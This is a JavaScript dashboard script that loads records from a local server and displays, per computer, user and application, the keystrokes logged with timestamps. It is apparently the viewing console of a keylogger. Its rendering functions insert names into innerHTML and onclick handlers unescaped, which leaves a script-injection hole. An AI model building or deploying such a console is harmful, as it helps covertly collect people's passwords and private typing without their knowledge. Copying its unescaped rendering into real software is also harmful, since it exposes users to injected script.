const computersPerPage = 15; // ✅ Limit how many items are shown per page
let currentPage = 1;
let allComputersData = [];
let filteredComputersData = []; // Stores search results

function fetchComputers() {
    let computersContainer = document.getElementById("computers-container");
    computersContainer.innerHTML = `<p class="text-muted">Loading computers...</p>`;

    fetch("http://127.0.0.1:5556/computers")
        .then(response => response.json())
        .then(data => {
            allComputersData = Object.entries(data);
            filteredComputersData = allComputersData; // ✅ Start with full dataset
            renderPage();
        })
        .catch(error => {
            console.error("Error fetching computers:", error);
            computersContainer.innerHTML = `<p class="text-danger">Error loading data.</p>`;
        });
}

function searchComputers() {
    let searchValue = document.getElementById("computer-search").value.toLowerCase();

    if (searchValue) {
        filteredComputersData = allComputersData.filter(([computer, users]) =>
            computer.toLowerCase().includes(searchValue) ||
            users.some(userInfo => userInfo.user.toLowerCase().includes(searchValue))
        );
        currentPage = 1; // ✅ Reset to first page when searching
    } else {
        filteredComputersData = allComputersData; // ✅ Show full data if search is cleared
    }

    renderPage();
}

function renderPage() {
    let computersContainer = document.getElementById("computers-container");
    computersContainer.innerHTML = "";

    let start = (currentPage - 1) * computersPerPage;
    let end = start + computersPerPage;
    let computersToShow = filteredComputersData.slice(start, end);

    computersToShow.forEach(([computer, users]) => {
        let usersHtml = users.map(userInfo => `
            <li class="list-group-item list-group-item-action" onclick="fetchUserDetails('${computer}', '${userInfo.user}')">
                👤 ${userInfo.user} 
                <span class="badge text-bg-secondary float-end">${userInfo.apps_count} Apps, ${userInfo.keys_logged} Keys</span>
            </li>
        `).join("");

        computersContainer.innerHTML += `
            <li class="list-group-item">
                <strong>${computer}</strong>
                <ul class="list-unstyled">${usersHtml}</ul>
            </li>`;
    });

    updatePagination();
}

function updatePagination() {
    let paginationDiv = document.getElementById("pagination-controls");
    let totalPages = Math.ceil(filteredComputersData.length / computersPerPage);

    paginationDiv.innerHTML = `
        <button class="btn btn-sm btn-outline-secondary" onclick="changePage(-1)" ${currentPage === 1 ? "disabled" : ""}>⬅️ Previous</button>
        <span> Page ${currentPage} of ${totalPages} </span>
        <button class="btn btn-sm btn-outline-secondary" onclick="changePage(1)" ${currentPage === totalPages ? "disabled" : ""}>Next ➡️</button>
    `;

    // ✅ Hide pagination when searching to show all results at once
    paginationDiv.style.display = filteredComputersData.length === allComputersData.length ? "block" : "none";
}

function changePage(step) {
    currentPage += step;
    renderPage();
}

function displayComputers(data) {
    let computersContainer = document.getElementById("computers-container");

    for (let computer in data) {
        let usersHtml = data[computer].map(userInfo => `
            <li class="list-group-item list-group-item-action" onclick="fetchUserDetails('${computer}', '${userInfo.user}')">
                👤 ${userInfo.user} 
                <span class="badge text-bg-secondary float-end">${userInfo.apps_count} Apps, ${userInfo.keys_logged} Keys</span>
            </li>
        `).join("");

        let computerHtml = `
            <li class="list-group-item">
                <strong>${computer}</strong>
                <ul class="list-unstyled">${usersHtml}</ul>
            </li>
        `;

        computersContainer.innerHTML += computerHtml;
    }
}

function fetchUserDetails(computerName, userName) {
    // let userDetails = document.getElementById("user-details");
    let logsContainer = document.getElementById("logs-container");
    let loadingUser = document.getElementById("loading-user");
    let selectMsg = document.getElementById("select-user-msg");

    logsContainer.innerHTML = ""; // Clear previous logs
    selectMsg.style.display = "none"; // Hide "Select a user" message
    loadingUser.style.display = "block"; // Show loading message

    fetch(`http://127.0.0.1:5556/user_data?computer=${computerName}&user=${userName}`)
        .then(response => response.json())
        .then(data => {
            displayUserDetails(computerName, userName, data);
        })
        .catch(error => {
            console.error("Error fetching user details:", error);
            logsContainer.innerHTML = `<p class="text-danger">Error loading user logs.</p>`;
        })
        .finally(() => {
            loadingUser.style.display = "none"; // Hide loading message
        });
}

function generateLogTable(logs) {
    let tableHtml = `
        <table class="table table-striped">
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Keys Logged</th>
                </tr>
            </thead>
            <tbody>`;

    for (let [timestamp, keys] of Object.entries(logs)) {
        let keyButtons = keys.map(key => `<span class="key-button">${key}</span>`).join(" ");

        tableHtml += `
            <tr>
                <td>${timestamp}</td>
                <td>${keyButtons}</td>
            </tr>`;
    }

    tableHtml += `</tbody></table>`;
    return tableHtml;
}

function displayUserDetails(computerName, userName, userData) {
    let logsContainer = document.getElementById("logs-container");
    logsContainer.innerHTML = `<h4>${computerName} - ${userName}</h4>`;

    for (let app in userData) {
        let appId = `log-${computerName}-${userName}-${app.replace(/\s+/g, '-')}`;

        let totalKeys = Object.values(userData[app]).reduce((sum, keys) => sum + keys.length, 0); // ✅ Count total keys

        logsContainer.innerHTML += `
            <div class="card mb-2 p-2">
                <h6>${app}</h6>
                <p class="text-muted small">${totalKeys} keys recorded</p> <!-- ✅ Muted key count -->
                <button class="btn btn-sm btn-secondary" onclick="toggleLogs('${appId}')">
                    Show Logs
                </button>
                <div id="${appId}" class="collapse">
                    ${generateLogTable(userData[app])}
                </div>
            </div>`;
    }
}

function toggleLogs(appId) {
    let logDiv = document.getElementById(appId);
    if (logDiv.classList.contains("show")) {
        logDiv.classList.remove("show");
    } else {
        logDiv.classList.add("show");
    }
}

function applyTheme() {
    const isDarkMode = localStorage.getItem("theme") === "dark" || 
        (localStorage.getItem("theme") === null && window.matchMedia("(prefers-color-scheme: dark)").matches);

    document.documentElement.setAttribute("data-bs-theme", isDarkMode ? "dark" : "light");
    localStorage.setItem("theme", isDarkMode ? "dark" : "light");

    document.getElementById("theme-toggle").textContent = isDarkMode ? "☀️ Light Mode" : "🌙 Dark Mode";
}

document.getElementById("theme-toggle").addEventListener("click", function () {
    const currentTheme = localStorage.getItem("theme") === "dark" ? "light" : "dark";
    localStorage.setItem("theme", currentTheme);
    applyTheme();
});

document.addEventListener("DOMContentLoaded", applyTheme);
document.addEventListener("DOMContentLoaded", fetchComputers);
